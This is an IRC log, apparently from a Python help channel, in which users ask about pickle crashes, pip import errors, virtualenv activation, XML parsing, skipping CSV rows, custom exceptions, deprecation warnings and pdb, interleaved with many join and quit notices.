[08:57:04] *** Joins: fr0ddy (~fr0ddy@49.248.66.98)
[08:57:16] *** Quits: fr0ddy (~fr0ddy@49.248.66.98) (Max SendQ exceeded)
[08:57:18] *** Quits: jjulian (~jjulian@i5DB5037D.pool.tripleplugandplay.com) (Ping timeout: 260 seconds)
[08:57:37] <cdunklau> Zinob: quick-and-dirty has a habit of becoming production code
[08:57:37] *** Quits: AliGeyik (~Thunderbi@82.222.185.98) (Ping timeout: 248 seconds)
[08:57:38] <cdunklau> :P
[08:57:44] *** Joins: electrofelix (~pelix@15.203.233.80)
[08:57:56] *** Joins: Kundry_Wag (~Kundry_Wa@177.18.249.170)
[08:57:57] *** Quits: greg_f (~greg@altlinux/developer/greg) (Ping timeout: 240 seconds)
[09:00:08] *** Quits: fikka (~fikka@31.223.233.9) (Ping timeout: 255 seconds)
[09:00:21] *** Joins: naan_ (~naan@unaffiliated/naan)
[09:00:43] *** Joins: jjulian (~jjulian@i5DB5037D.pool.tripleplugandplay.com)
[09:01:11] *** Joins: fr0ddy (~fr0ddy@49.248.66.98)
[09:01:11] *** Quits: fr0ddy (~fr0ddy@49.248.66.98) (Remote host closed the connection)
[09:01:32] *** Joins: fr0ddy (~fr0ddy@49.248.66.98)
[09:01:57] *** Joins: therue (~therue@1-162-68-203.dynamic-ip.hinet.net)
[09:02:57] *** Joins: sgtlion (~sgtsomebo@110.187.198.146.dyn.plus.net)
[09:03:07] *** Joins: rudrab (~rudrab@14.139.59.140)
[09:03:11] *** Quits: bigjazzsound1 (~bigjazzso@2604:a880:cad:d0::2fd:9001) (Quit: WeeChat 1.4)
[09:03:28] *** Joins: bigjazzsound1 (~bigjazzso@2604:a880:cad:d0::2fd:9001)
[09:03:28] <Zinob> cdunklau: that has never happened to me ... ...
[09:03:35] *** Joins: Darkhunter (~mmojzis@ip-86-49-120-171.net.upcbroadband.cz)
[09:03:41] <cdunklau> Zinob: yet!
[09:03:45] <cdunklau> or that you know of! :)
[09:04:01] *** Quits: rendar (~rendar@unaffiliated/rendar) (Ping timeout: 248 seconds)
[09:04:19] *** Joins: alexandre9099 (~alexandre@unaffiliated/alexandre9099)
[09:04:20] *** Joins: Kestrel-029 (~Nicmavr@unaffiliated/nicmavr)
[09:04:35] *** Joins: callMe_Dude (~callMe_Du@117.221.144.188)
[09:04:36] <Zinob> cdunklau: Well i am off to eat a ton of crow
[09:04:48] *** Quits: graphene (~graphene@46.101.134.251) (Remote host closed the connection)
[09:04:54] <Zinob> cdunklau: I installed the needed debug symbols and it is CPickle that is crashing.
[09:05:17] *** Joins: fikka (~fikka@31.223.233.9)
[09:05:22] *** Joins: graphene (~graphene@46.101.134.251)
[09:05:28] *** Joins: sunil_bansal (~sunil_ban@123.63.30.29)
[09:05:31] <cdunklau> holy crap
[09:05:39] <cdunklau> Zinob: well stop using shelve then :P
[09:05:44] <cdunklau> json FTW
[09:05:53] <wleslie> did I ever tell you the time that an errant pickle changed the value of 1
[09:06:23] <Zinob> https://paste.pound-python.org/show/Gja8iXw881KZ2rtY1rEz/
[09:06:35] *** Quits: luckman212 (~luckman21@unaffiliated/luckman212) (Quit: Bye)
[09:06:36] *** Quits: bigjazzsound1 (~bigjazzso@2604:a880:cad:d0::2fd:9001) (Remote host closed the connection)
[09:06:44] <Zinob> cdunklau: but then i have to spend sliiightly more time thinking about my data structures.
[09:06:53] *** Joins: bigjazzsound1 (~bigjazzso@2604:a880:cad:d0::2fd:9001)
[09:07:15] <Zinob> wleslie: How do you eaven?
[09:07:16] *** Quits: Darkhunter (~mmojzis@ip-86-49-120-171.net.upcbroadband.cz) (Client Quit)
[09:07:19] <Zinob> *even
[09:07:36] *** Joins: Darkhunter (~mmojzis@ip-86-49-120-171.net.upcbroadband.cz)
[09:08:18] *** Quits: basen_ (~basen_@62.178.248.26) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[09:08:24] *** Joins: LambaInsaan (~lambainsa@106.51.36.9)
[09:08:45] *** Quits: rudrab (~rudrab@14.139.59.140) (Ping timeout: 264 seconds)
[09:09:15] *** Joins: Vornotron (~Vorn@2605:e000:1218:48d:9cb:b682:cdd2:e245)
[09:09:16] *** Joins: rpkilby (~rpkilby@cpe-76-182-45-76.nc.res.rr.com)
[09:09:25] *** Joins: luckman212 (~luckman21@unaffiliated/luckman212)
[09:09:44] *** Quits: stitched_unicorn (~textual@fs276ed214.tkyc201.ap.nuro.jp) (Quit: stitched_unicorn)
[09:09:45] *** Joins: Mayurvpatil (~mayurvpat@202.149.218.202)
[09:09:51] *** Joins: Avinash (~Avinash@unaffiliated/avinash)
[09:10:05] *** Quits: fikka (~fikka@31.223.233.9) (Ping timeout: 260 seconds)
[09:10:48] *** Joins: TidB (~TidB@pD9FCEBC9.dip0.t-ipconnect.de)
[09:11:09] *** Joins: basen_ (~basen_@62.178.248.26)
[09:11:20] *** Joins: stahl (~stahl@81.24.150.83.ftth.as8758.net)
[09:11:42] *** Joins: greg_f (~greg@altlinux/developer/greg)
[09:12:16] *** Quits: Avinash (~Avinash@unaffiliated/avinash) (Client Quit)
[09:12:35] *** Quits: Vornicus (~Vorn@2605:e000:1218:48d:9cb:b682:cdd2:e245) (Ping timeout: 276 seconds)
[09:12:54] *** Joins: fikka (~fikka@31.223.233.9)
[09:14:16] *** Quits: rpkilby (~rpkilby@cpe-76-182-45-76.nc.res.rr.com) (Ping timeout: 265 seconds)
[09:15:16] *** Quits: koma5 (~marco@souffle.byteli.net) (Quit: leaving)
[09:16:18] *** Joins: stitched_unicorn (~textual@fs276ed214.tkyc201.ap.nuro.jp)
[09:16:52] *** Joins: koma5 (~marco@souffle.byteli.net)
[09:16:56] *** Quits: davr0s (~textual@host86-138-235-28.range86-138.btcentralplus.com) (Quit: My MacBook Pro has gone to sleep. ZZZzzz…)
[09:17:06] <meriipu> I really wish there was a goto or some labelled break for nested for loops on the module level namespace
[09:17:35] <cdunklau> Zinob: oh nooooo
[09:17:37] *** Quits: cgabriel (~cgabriel@212.91.77.26) (Remote host closed the connection)
[09:17:39] *** Joins: aielima (~aielima@gateway/tor-sasl/aielima)
[09:17:42] <psychuil> So i updated pip and now i'm getting     from pip import main
[09:17:42] <psychuil> ImportError: cannot import name main
[09:17:48] <cdunklau> Zinob: that's the main thing you _need_ to be thinking about
[09:17:52] <psychuil> Anyone know how to fix this?
[09:18:02] <Zinob> cdunklau: i know, right?
[09:18:17] <MrElendig> psychuil: how did you update it?
[09:18:32] <psychuil> pip install --upgrade pip
[09:18:42] *** Quits: bluex (~bluex@192.55.54.42) (Remote host closed the connection)
[09:19:06] *** Joins: bluex (bluex@nat/intel/x-rdruelihomsskbqx)
[09:19:11] <cdunklau> wleslie: do tell
[09:19:12] <MrElendig> as root? in a venv?
[09:19:28] <psychuil> as a user from pycharm
[09:19:36] <psychuil> think i'm root, but i didn't invoke it
[09:19:43] <psychuil> didn't get any error
[09:19:43] <psychuil> s
[09:20:25] *** Joins: cgabriel (~cgabriel@212.91.77.26)
[09:20:39] *** Quits: tino097 (~tino097@77.29.181.48) (Quit: tino097)
[09:21:17] *** Quits: jcrowgey (~jcrowgey@gateway/tor-sasl/jcrowgey) (Ping timeout: 250 seconds)
[09:22:29] *** Quits: fikka (~fikka@31.223.233.9) (Ping timeout: 265 seconds)
[09:22:35] *** Joins: Syzygy (~Syzygy@e242-239.eduroam.tuwien.ac.at)
[09:22:44] *** Quits: rsrx (~rsrx@cable-94-189-226-199.dynamic.sbb.rs) (Read error: Connection reset by peer)
[09:22:54] <psychuil> Got it, hash -r helped
[09:22:54] <wleslie> cdunklau: looking for the log, I can't seem to find it
[09:23:01] *** Joins: jcrowgey (~jcrowgey@gateway/tor-sasl/jcrowgey)
[09:23:10] <cdunklau> no biggie
[09:23:20] *** Quits: wleslie (~verte@python/site-packages/verte) (Quit: ~~~ Crash in JIT!)
[09:23:35] *** Quits: bluex (bluex@nat/intel/x-rdruelihomsskbqx) (Ping timeout: 245 seconds)
[09:24:23] *** Parts: viccuad (viccuadmat@gateway/shell/matrix.org/x-rypnouhikjjjyery) ("User left")
[09:24:25] *** Quits: LambaInsaan (~lambainsa@106.51.36.9) (Ping timeout: 265 seconds)
[09:24:32] *** Joins: tdn (~tdn@x50d248d8.cust.hiper.dk)
[09:24:35] *** Quits: psi29a (~psi29a@dD5773DA3.access.telenet.be) (Ping timeout: 240 seconds)
[09:25:02] *** Quits: s14ve (~s14ve@80.188.193.126) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[09:25:03] *** Joins: Vladek (~Chris@60.227.75.119)
[09:26:03] *** Quits: bigjazzsound1 (~bigjazzso@2604:a880:cad:d0::2fd:9001) (Quit: WeeChat 1.4)
[09:26:19] *** Quits: uttam (~uttam@vpn.bose.res.in) (Quit: uttam)
[09:26:33] *** Joins: rudrab (~rudrab@14.139.59.140)
[09:26:57] *** Joins: zzzoid (~zzzoid@178.197.239.11)
[09:27:13] *** Joins: crmaurei (crmaurei@nat/qt/x-gfiwomerbhtksueq)
[09:29:23] *** Quits: roofy (~roofy@2600:1700:89a0:8ae0::45) (Ping timeout: 276 seconds)
[09:30:37] *** Quits: Syzygy (~Syzygy@e242-239.eduroam.tuwien.ac.at) (Ping timeout: 245 seconds)
[09:30:47] *** Quits: Kundry_Wag (~Kundry_Wa@177.18.249.170) (Ping timeout: 276 seconds)
[09:31:12] *** Joins: khanred (~khanred@unaffiliated/khanred)
[09:31:18] *** Quits: StygianBlues (~StygianBl@74-194-176-205.chstcmtk03.res.dyn.suddenlink.net) (Read error: Connection reset by peer)
[09:31:19] *** Joins: davr0s (~textual@host86-138-235-28.range86-138.btcentralplus.com)
[09:31:22] *** Joins: rudrab_ (~rudrab@14.139.59.140)
[09:31:40] *** Quits: rudrab (~rudrab@14.139.59.140) (Read error: Connection reset by peer)
[09:31:40] *** rudrab_ is now known as rudrab
[09:33:07] *** Quits: tsaka__ (~torstein@84-52-234.108.3p.ntebredband.no) (Ping timeout: 265 seconds)
[09:33:38] *** Joins: s14ve (~s14ve@80.188.193.126)
[09:33:59] *** Joins: Ergo (~ergo@91.238.59.144)
[09:34:01] *** Joins: tsaka__ (~torstein@84-52-234.108.3p.ntebredband.no)
[09:34:23] *** Joins: StygianBlues (~StygianBl@74-194-176-205.chstcmtk03.res.dyn.suddenlink.net)
[09:34:40] *** Joins: Syzygy (~Syzygy@e242-239.eduroam.tuwien.ac.at)
[09:35:06] *** Joins: callMe_something (~callMe_Du@117.201.136.141)
[09:35:10] *** Joins: adamholmberg (~adamholmb@69.80.114.120)
[09:35:23] *** Quits: andyhuzhill (~andyhuzhi@14.23.45.178) (Quit: andyhuzhill)
[09:36:25] *** Joins: dre_ (~dre_@121-74-95-135.telstraclear.net)
[09:36:39] *** Joins: fikka (~fikka@31.223.233.9)
[09:36:59] *** Quits: callMe_Dude (~callMe_Du@117.221.144.188) (Ping timeout: 265 seconds)
[09:37:30] *** Quits: Draecos (~Draecos@203.121.220.138) (Quit: This computer has gone to sleep)
[09:38:44] *** Joins: rsrx (~rsrx@cable-94-189-224-42.dynamic.sbb.rs)
[09:39:09] *** Joins: DodgeThis (~DodgeThis@60.129.63.94.rev.vodafone.pt)
[09:39:35] *** Quits: kjam (~katharine@ahhhhmazing.com) (Quit: leaving)
[09:39:35] *** Quits: s14ve (~s14ve@80.188.193.126) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[09:39:50] *** Quits: adamholmberg (~adamholmb@69.80.114.120) (Ping timeout: 260 seconds)
[09:39:57] *** Quits: rudrab (~rudrab@14.139.59.140) (Ping timeout: 240 seconds)
[09:40:13] *** Quits: tsaka__ (~torstein@84-52-234.108.3p.ntebredband.no) (Remote host closed the connection)
[09:40:33] *** Joins: psi29a (~psi29a@129.253.244.4)
[09:40:40] *** Joins: tsaka__ (~torstein@84-52-234.108.3p.ntebredband.no)
[09:40:44] *** Joins: doubtful (~abhigenie@dyn-160-39-2-144.dyn.columbia.edu)
[09:41:31] *** Quits: doubtful (~abhigenie@dyn-160-39-2-144.dyn.columbia.edu) (Client Quit)
[09:41:36] *** Quits: pathrocle (~pathrocle@ldap.nchadvisors.ro) (Remote host closed the connection)
[09:41:37] *** Parts: DTEIT (plambri@nat/redhat/x-nuzbljgfqxtjksvq) ("WeeChat 2.0.1")
[09:41:50] <callMe_something> how can I make my Python3 code look more professional, clean and maintainable ? What is difference between pep8 and pep20 ?
[09:41:54] *** Joins: pathrocle (~pathrocle@ldap.nchadvisors.ro)
[09:42:35] *** Quits: Pyrus (~pyrus@unaffiliated/pyrus) (Quit: ZNC - http://znc.in)
[09:42:38] *** Joins: daze (~daze@unaffiliated/daze)
[09:42:42] <jancoow_> ugh. I'm using blockly to create simple if/else statements . Need to parse the output xml of blockly in python somehow :/ not sure how to do that
[09:42:53] *** Quits: BtbN (btbn@ffmpeg/developer/btbn) (Remote host closed the connection)
[09:43:16] <bjs> callMe_something: pep8 is the style guide for the python standard library and pep20 is a poem
[09:43:35] <bjs> with some pithy lines about programming
[09:43:45] *** Joins: Pyrus (~pyrus@unaffiliated/pyrus)
[09:43:51] *** Quits: brainproxy (~michael@pdpc/supporter/gold/brainproxy) (Ping timeout: 240 seconds)
[09:44:54] *** Joins: BtbN (btbn@ffmpeg/developer/btbn)
[09:45:38] *** Quits: Syzygy (~Syzygy@e242-239.eduroam.tuwien.ac.at) (Ping timeout: 276 seconds)
[09:45:39] <naan_> (ENV)$ deactivate #this is taken from the virtualenv docs what is "(ENV)$" here ?
[09:46:24] *** Joins: LambaInsaan (~lambainsa@157.49.226.37)
[09:46:38] *** Joins: bigjazzsound1 (~bigjazzso@2604:a880:cad:d0::2fd:9001)
[09:46:40] *** Quits: bigjazzsound1 (~bigjazzso@2604:a880:cad:d0::2fd:9001) (Client Quit)
[09:46:56] *** Quits: ilyaman (ilyaman@nat/novell/x-ifvcwsglgqlhiipf) (Ping timeout: 276 seconds)
[09:46:59] *** Joins: bigjazzsound1 (~bigjazzso@2604:a880:cad:d0::2fd:9001)
[09:47:10] <cdunklau> naan_: the prompt
[09:47:13] *** Quits: CtrlC (~CtrlC@unaffiliated/ctrlc) (Ping timeout: 256 seconds)
[09:47:19] <naan_> oh
[09:47:32] *** Quits: pathrocle (~pathrocle@ldap.nchadvisors.ro) (Ping timeout: 256 seconds)
[09:47:33] *** Quits: sunil_bansal (~sunil_ban@123.63.30.29) (Remote host closed the connection)
[09:47:46] *** Quits: basen_ (~basen_@62.178.248.26) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[09:47:47] *** Joins: re1 (~rsrx@cable-94-189-224-42.dynamic.sbb.rs)
[09:47:51] *** Joins: Draecos (~Draecos@203.121.220.138)
[09:47:53] *** Joins: sunil_bansal (~sunil_ban@123.63.30.29)
[09:48:28] <cdunklau> naan_: when you source the activate script, it puts (dirname) before the prompt
[09:48:33] *** Quits: luckman212 (~luckman21@unaffiliated/luckman212) (Ping timeout: 256 seconds)
[09:48:53] *** Joins: pathrocle (~pathrocle@46.97.4.154)
[09:48:54] <naan_> oh i never activated it
[09:49:07] <naan_> praise the lord I can just remove it all then
[09:49:11] <cdunklau> naan_: then don't worry about it
[09:49:19] <naan_> gosh I'm dumb
[09:49:21] <naan_> thank you
[09:49:28] <cdunklau> naan_: activating a venv isn't necessary. i basically never do it
[09:49:29] *** Quits: sunil_bansal (~sunil_ban@123.63.30.29) (Remote host closed the connection)
[09:49:36] <cdunklau> naan_: all it does is hack your PATH
[09:49:54] <naan_> ah that makes things clearer
[09:49:59] *** Quits: gacrux (~gacrux@2406:e006:6d9d:1:3105:d394:12df:5161) (Quit: ZZZzzz…)
[09:50:10] <cdunklau> naan_: you can just run the venv's python directly:  path/to/venv/bin/python
[09:50:34] *** Joins: sunil_bansal (~sunil_ban@123.63.30.29)
[09:50:37] <cdunklau> naan_: python picks up where to look for its library from the path of the executable
[09:50:39] <naan_> sure I just put it in the wrong folder i put ~tensorflow and missed a backslash
[09:50:47] <cdunklau> heh
[09:50:53] *** Quits: stitched_unicorn (~textual@fs276ed214.tkyc201.ap.nuro.jp) (Quit: stitched_unicorn)
[09:50:56] *** Quits: rsrx (~rsrx@cable-94-189-224-42.dynamic.sbb.rs) (Ping timeout: 256 seconds)
[09:51:12] <cdunklau> naan_: i tend to just stick a virtualenv in the project dir (and definitely don't commit to source control :)
[09:51:12] *** Joins: s14ve (~s14ve@80.188.193.126)
[09:51:21] *** Joins: han-solo (~han-solo@unaffiliated/han-solo)
[09:51:25] *** Joins: luckman212 (~luckman21@unaffiliated/luckman212)
[09:51:26] <naan_> ok i'll do that for now
[09:51:27] *** Quits: cdown (~cdown@88.98.208.5) (Ping timeout: 240 seconds)
[09:51:28] *** Quits: sunil_bansal (~sunil_ban@123.63.30.29) (Remote host closed the connection)
[09:51:32] *** Quits: bablux (~bablux@gateway/tor-sasl/cyril1) (Quit: bablux)
[09:51:44] *** Joins: antgel (~topdog@141.226.120.30)
[09:51:48] <cdunklau> naan_: tox https://tox.readthedocs.io/ is also a nice thing
[09:51:53] *** Quits: alexandre9099 (~alexandre@unaffiliated/alexandre9099) (Quit: ZNC 1.7.0 - https://znc.in)
[09:52:00] *** Quits: bigjazzsound1 (~bigjazzso@2604:a880:cad:d0::2fd:9001) (Quit: WeeChat 1.4)
[09:52:25] *** Quits: ycon_ (~ycon_@202-172-111-51-cpe.spintel.net.au) (Remote host closed the connection)
[09:53:05] *** Joins: ycon_ (~ycon_@202-172-111-51-cpe.spintel.net.au)
[09:53:10] *** Quits: Burrito (~Burrito@unaffiliated/burrito) (Ping timeout: 264 seconds)
[09:53:13] *** Quits: vicenteH (~user@195.235.96.150) (Read error: Connection reset by peer)
[09:53:21] *** Quits: NccT (~NccT@unaffiliated/ncct) (Quit: leaving)
[09:53:30] *** Joins: vicenteH (~user@195.235.96.150)
[09:54:01] *** Quits: ezakimak (~ezakimak@c-24-2-94-111.hsd1.ut.comcast.net) (Ping timeout: 256 seconds)
[09:54:19] *** Quits: s14ve (~s14ve@80.188.193.126) (Client Quit)
[09:54:21] <Vladek> cdunklau: I do the same. I still havent wrapped my head around Git
[09:54:39] *** Joins: alexandre9099 (~alexandre@unaffiliated/alexandre9099)
[09:54:48] *** Quits: rjdp9736 (~rjdp9736@49.205.216.204) (Quit: My MacBook Air has gone to sleep. ZZZzzz…)
[09:54:49] <Vladek> I need to though. I'd prefer to have a central repo for all machines I use to edit
[09:54:51] <cdunklau> Vladek: learn it
[09:55:08] <Vladek> I use a windows box and a pi
[09:55:20] <cdunklau> and?
[09:55:24] <cdunklau> git runs on both
[09:55:40] <Vladek> that wasnt a response to your statement
[09:55:47] *** Joins: ezakimak (~ezakimak@c-24-2-94-111.hsd1.ut.comcast.net)
[09:55:56] <cdunklau> :)
[09:56:02] <Vladek> > continuation of the line above.
[09:56:02] *** Joins: NccT (~NccT@unaffiliated/ncct)
[09:56:35] <cdunklau> Vladek: you don't have to have a repo on a server though
[09:57:15] <Vladek> cdunklau: hmmm, but I'm not actually after version control. I'm after the centrality really.
[09:57:25] *** Quits: ycon_ (~ycon_@202-172-111-51-cpe.spintel.net.au) (Ping timeout: 256 seconds)
[09:57:28] <jancoow_> someone willing to help thinking? :P
[09:58:06] <Vladek> cdunklau: it's still a essential topic. Granted. Time to learn it.
[09:58:18] *** Joins: gacrux (~gacrux@2406:e006:6d9d:1:3105:d394:12df:5161)
[09:58:18] *** Quits: n35xdxb0 (~n35xdxb0@81.171.98.49) (Ping timeout: 256 seconds)
[09:58:19] <cdunklau> Vladek: always be after version control
[09:58:26] *** Quits: callMe_something (~callMe_Du@117.201.136.141) (Ping timeout: 256 seconds)
[09:58:43] <Vladek>  :| I still use comments at the top of my file.... (yeesh)
[09:58:54] <cdunklau> Vladek: my problem is figuring out when version control isn't suitable :)
[09:59:11] *** Quits: Draecos (~Draecos@203.121.220.138) (Quit: This computer has gone to sleep)
[09:59:21] <cdunklau> jancoow_: post code/errors, ask a question
[09:59:23] *** Quits: platvoeten (~platvoete@178-85-122-247.dynamic.upc.nl) (Ping timeout: 276 seconds)
[09:59:26] <cdunklau> as usual
[09:59:33] <jancoow_> already asked it :)
[09:59:33] *** Joins: Fulgen (~Fulgen@078132032127.public.t-mobile.at)
[10:00:03] <jancoow_> "  I'm using blockly to create simple if/else statements . Need to parse the output xml of blockly in python somehow :/ not sure how to do that "
[10:00:14] *** Joins: n35xdxb0 (~n35xdxb0@cpc130684-camd16-2-0-cust846.know.cable.virginm.net)
[10:00:31] <odinsbane> jancoow_: did you consider lxml?
[10:00:31] *** Quits: njbair (~njbair@2605:a000:122d:c254:227:eff:fe0a:b289) (Max SendQ exceeded)
[10:00:41] <cdunklau> jancoow_: so "how do i parse XML"?
[10:00:43] *** Joins: sunil_bansal (~sunil_ban@123.63.30.29)
[10:00:45] <cdunklau> yeah use lxml
[10:00:47] <jancoow_> well
[10:00:59] *** Joins: njbair (~njbair@cpe-104-231-109-72.neo.res.rr.com)
[10:01:23] <jancoow_> Yeah well I'm afraid I can't explain it over IRC :(
[10:01:25] *** Quits: lankanmon (~LKNnet@CPE64777d632383-CM64777d632380.cpe.net.cable.rogers.com) (Remote host closed the connection)
[10:01:35] <cdunklau> jancoow_: i'd probably start with the stdlib etree, it's a gentler introduction to the API https://docs.python.org/3/library/xml.etree.elementtree.html
[10:01:43] *** Quits: alexandre9099 (~alexandre@unaffiliated/alexandre9099) (Remote host closed the connection)
[10:02:03] <cdunklau> jancoow_: if you can't explain the problem, you don't understand it yet :P
[10:02:15] <jancoow_> https://jancokock.me/f/897dd I've these small if statements created in blockly, where "BMP180 xxx" is an database entry which needs to be compared with a value
[10:02:22] *** Joins: brainproxy (~michael@pdpc/supporter/gold/brainproxy)
[10:02:33] <jancoow_> and "ms35analgoledcontroller" database entry needs to get a new value
[10:02:44] *** Joins: s14ve (~s14ve@80.188.193.126)
[10:02:45] <jancoow_> This blockly creates a xml
[10:03:57] *** Quits: Vladek (~Chris@60.227.75.119) (Quit: leaving)
[10:04:23] *** Joins: biberu (~biberu@193.150.203.9)
[10:04:25] *** Joins: Allegretto (~allegrett@212.52.160.157)
[10:05:02] <anddam> is   for _ in range(n): csv_file.next()   an appropriate way of skipping first n rows of a file?
[10:05:14] *** Joins: ilyaman (ilyaman@nat/suse/x-vpajtepdbjoazneu)
[10:05:16] <cdunklau> anddam: next(csv_file_ but sure
[10:05:23] <cdunklau> next(csv_file) that is
[10:05:27] <anddam> I'm in a context manager body, so I have with open(source_file, "r") as csv_file:
[10:05:56] *** Quits: Cryp71c (~Cryp71c@2600:1700:23d0:aa00:24a2:dfc0:4ec8:f449) (Read error: Connection reset by peer)
[10:06:10] *** xqb` is now known as xqb
[10:06:57] *** Quits: brainproxy (~michael@pdpc/supporter/gold/brainproxy) (Ping timeout: 240 seconds)
[10:07:08] <cdunklau> anddam: or you could just wrap it in itertools.islice:   islice(csv_file, 5, None)
[10:07:19] <cdunklau> and pass that to the thing that uses it
[10:07:23] <anddam> cdunklau: oh, I like that more
[10:07:42] <cdunklau> anddam: but the error conditions are different
[10:07:45] <cdunklau> i think
[10:08:16] <cdunklau> yes
[10:08:36] <cdunklau> anddam: with the for/range/next thing, you'll get an exception if the file doesn't have 5 lines in it
[10:08:36] *** Quits: s14ve (~s14ve@80.188.193.126) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[10:08:48] *** Joins: m0j0dj0dj0 (~punk3r@unaffiliated/m0j0dj0dj0)
[10:08:49] <cdunklau> anddam: with islice, you'll just get no results
[10:08:58] <anddam> fair enough for me
[10:09:01] <anddam> thanks
[10:09:08] *** Joins: ShyPixie (IdentME@unaffiliated/shypixie)
[10:09:19] <anddam> namely I'm parsing a CSV file and I know it's ill-formatted and first 5 rows have to been discarded
[10:09:47] <anddam> but atm I cannot remember why, I'll check one of the example files, maybe skipping lines isn't needed in first place
[10:10:00] *** Joins: rpkilby (~rpkilby@cpe-76-182-45-76.nc.res.rr.com)
[10:10:39] *** Quits: Mayurvpatil (~mayurvpat@202.149.218.202) (Ping timeout: 256 seconds)
[10:11:22] *** Joins: rjdp9736 (~rjdp9736@49.205.216.204)
[10:11:27] *** Joins: ycon_ (~ycon_@202-172-111-51-cpe.spintel.net.au)
[10:11:37] *** Joins: wleslie (~verte@python/site-packages/verte)
[10:12:29] *** Quits: truthr (~truthr@unaffiliated/truthr) (Remote host closed the connection)
[10:14:24] *** Quits: sunil_bansal (~sunil_ban@123.63.30.29) (Remote host closed the connection)
[10:14:25] *** Quits: rpkilby (~rpkilby@cpe-76-182-45-76.nc.res.rr.com) (Ping timeout: 248 seconds)
[10:15:14] *** Joins: Alexander-47u (~Alexander@85.203.44.22)
[10:15:55] *** Joins: malachi (~malconten@91.207.175.200)
[10:16:12] *** Quits: mjolnird (~mjolnird@c-73-6-155-24.hsd1.tx.comcast.net) (Remote host closed the connection)
[10:18:17] *** Joins: senaps (25627232@gateway/web/cgi-irc/kiwiirc.com/ip.37.98.114.50)
[10:18:23] <psychuil> I'm trying to use mpld3 to export graphs into html, but i'm not getting the plots in the final email, what could be the cause of it?
[10:18:55] *** Quits: greg_f (~greg@altlinux/developer/greg) (Ping timeout: 260 seconds)
[10:19:00] <senaps> writing a class to handle all exceptions in code with, is not a good idea. is this a False or True statement? should we do it?
[10:19:49] <bjs> senaps: how would 1 class handle all exceptions?
[10:20:06] *** Joins: jb1123 (~Thunderbi@2a02:a03f:5230:2400:4db:7475:7a25:44a2)
[10:20:52] <senaps> bjs: its derived from Exception class and all exceptions are going through it: except Exception as e: MyCustomException("something")
[10:21:02] *** Quits: Haudegen (~quassel@178.115.237.87) (Remote host closed the connection)
[10:21:02] *** Joins: najtsirk (~kristjan@185.122.70.3)
[10:21:19] <bjs> senaps: oh! it doesn't handle exceptions it is an exception
[10:21:35] *** Joins: rudrab (~rudrab@14.139.59.140)
[10:21:37] *** Quits: tmsmith (~tmsmith@71-88-197-197.dhcp.kgpt.tn.charter.com) (Remote host closed the connection)
[10:21:38] *** Quits: Sepultura (~Sepultura@unaffiliated/sepultura) (Remote host closed the connection)
[10:21:51] <bjs> senaps: sure, it's fairly common to have a MyProgramException class that all the user-defined exceptions are subclasses of in your program
[10:22:11] <bjs> senaps: although I'm dubious about re-raising exceptions as your custom class everywhere for no reason
[10:22:46] *** Joins: Mayurvpatil (~mayurvpat@123.201.35.174)
[10:23:27] <senaps> what is happening is, using this  Exception for ioerror and keyerror and all the stuff. they want to do it, so they can get back with a specific style of exceptions!
[10:23:31] <senaps> bjs
[10:23:43] *** Joins: baxx (~user@2a02:c7f:7a71:3400:3a5f:a59b:ac72:4b71)
[10:23:46] <bjs> senaps: I'm not sure what you mean
[10:23:58] <baxx> is pdb what people usually use for debugging?
[10:24:01] <bjs> senaps: can you show some example code
[10:24:45] *** Parts: khanred (~khanred@unaffiliated/khanred) ("Leaving")
[10:25:09] <najtsirk> Hey. Have a question. I would like this to raise Deprecated Warning. How can I achivee that? Example: https://paste.pound-python.org/show/cblvLoVKBp5tIO8NeVwn/
[10:25:56] *** Quits: gacrux (~gacrux@2406:e006:6d9d:1:3105:d394:12df:5161) (Quit: ZZZzzz…)
[10:26:34] *** Joins: birkoff (~yoda@unaffiliated/birkoff)
[10:26:36] <cdunklau> najtsirk: why don't you think that works
[10:27:02] <cdunklau> najtsirk: oh you want the attribute access itself to warn?
[10:27:15] *** Quits: rjdp9736 (~rjdp9736@49.205.216.204) (Quit: My MacBook Air has gone to sleep. ZZZzzz…)
[10:27:46] *** Quits: teodorg (~teodorg@17751.telnet.bg) (Quit: Nettalk6 - www.ntalk.de)
[10:27:55] <cdunklau> najtsirk: that's gonna be tricky because it's a class attribute
[10:27:57] *** Joins: SynSynack (~Thunderbi@192-0-226-242.cpe.teksavvy.com)
[10:28:14] <bjs> cdunklau: with a descriptor? It returns the underlying value but with a warning
[10:28:16] <cdunklau> i mean you could do it, but you'd have to write a custom descriptor.
[10:28:18] <senaps> bjs is something like this. it isn't coded, it's just an idea: https://dpaste.de/4MKa
[10:28:36] <bjs> senaps: but why do you catch the exception just to raise one?
[10:28:44] <bjs> senaps: open() will already raise an exception with that info
[10:28:46] *** Quits: derk0pf (~derk0pf@p5497B8F0.dip0.t-ipconnect.de) (Ping timeout: 260 seconds)
[10:29:27] <cdunklau> baxx: sure. i tend to just use print though
[10:29:30] *** Quits: didels (~didels@213.236.200.180) (Quit: WeeChat 1.9.1)
[10:29:31] <najtsirk> cdunklau: yes. Can you point me to that?
[10:29:37] *** Quits: clearcasting (~clearcast@220.240.15.119) (Quit: ZNC 1.8.x-nightly-20180629-c2731dfe - https://znc.in)
[10:29:44] <baxx> cdunklau: pdb isn't much better than just printing stuff then , eh.
[10:29:49] <cdunklau> baxx: indeed
[10:29:49] <baxx> I'll ignore pdb then
[10:30:01] <cdunklau> baxx: there are other alternate debuggers though
[10:30:05] <bjs> baxx: I hear some people like pudb
[10:30:13] <baxx> cdunklau: that are better than pdb?
[10:30:22] *** Quits: rudrab (~rudrab@14.139.59.140) (Ping timeout: 264 seconds)
[10:30:28] <baxx> I thought the point was that you could step through line by line and print variables off as you went
[10:30:30] *** Joins: clearcasting (~clearcast@220.240.15.119)
[10:30:33] *** Quits: jianxiongZ (~jianxiong@223.223.187.142) (Quit: Leaving)
[10:30:35] <baxx> perhaps I've imagined that though I'm not sure
[10:30:38] *** Joins: YuGiOhJCJ (~YuGiOhJCJ@gateway/tor-sasl/yugiohjcj)
[10:30:39] *** Joins: tobra (~tobra@gate.acs-plus.fta-berlin.de)
[10:30:46] <wleslie> you can do that in pdb, yes
[10:31:02] <wleslie> the module documentation covers the use cases, and the commands
[10:31:07] *** Joins: cdown (~cdown@199.201.66.44)
